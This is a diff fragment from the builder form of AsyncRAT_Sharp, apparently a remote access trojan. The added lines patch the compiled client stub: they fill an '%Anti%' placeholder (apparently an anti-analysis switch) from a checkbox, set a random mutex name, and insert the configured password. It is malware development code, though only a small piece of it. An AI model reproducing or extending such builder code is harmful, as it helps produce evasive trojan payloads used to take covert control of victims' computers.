@@ -52,6 +52,12 @@ namespace AsyncRAT_Sharp.Forms
                                     if (method.Body.Instructions[i].Operand.ToString() == "false")
                                         method.Body.Instructions[i].Operand = checkBox1.Checked.ToString().ToLower();
 
+                                    if (method.Body.Instructions[i].Operand.ToString() == "%Anti%")
+                                        method.Body.Instructions[i].Operand = chkAnti.Checked.ToString().ToLower();
+
+                                    if (method.Body.Instructions[i].Operand.ToString() == "%MTX%")
+                                        method.Body.Instructions[i].Operand = Path.GetRandomFileName();
+
                                     if (method.Body.Instructions[i].Operand.ToString() == "NYAN CAT")
                                         method.Body.Instructions[i].Operand = Settings.Password;
                                 }
